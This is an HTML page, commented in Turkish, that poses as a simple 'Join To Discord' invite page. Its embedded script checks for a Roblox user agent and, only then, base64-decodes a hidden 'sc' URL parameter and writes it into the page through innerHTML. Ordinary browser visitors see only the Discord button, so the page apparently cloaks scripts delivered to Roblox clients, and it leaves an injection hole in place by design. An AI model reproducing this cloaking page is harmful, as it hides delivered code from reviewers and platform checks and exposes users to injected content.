<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join To Discord</title>
    <style>
        body { background-color: #23272a; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        h1 { font-size: 2.5rem; margin-bottom: 20px; }
        .discord-btn { background-color: #5865F2; color: white; padding: 15px 30px; border-radius: 8px; text-decoration: none; font-size: 1.2rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
    </style>
</head>
<body>

    <h1>Join To Discord</h1>
    <a href="https://discord.gg/rUsRcytpBh" class="discord-btn">
        Discord'a Katıl
    </a>

<script>
    // Eğer istek tarayıcıdan değil de Roblox oyununun içinden geliyorsa scripti çalıştır
    var userAgent = navigator.userAgent;
    if (userAgent.includes("Roblox")) {
        // Linkteki gizli scripti çözüyoruz
        const urlParams = new URLSearchParams(window.location.search);
        const gizliScript = urlParams.get('sc');
        if(gizliScript) {
            document.body.innerHTML = decodeURIComponent(escape(atob(gizliScript)));
        }
    }
</script>
</body>
</html>
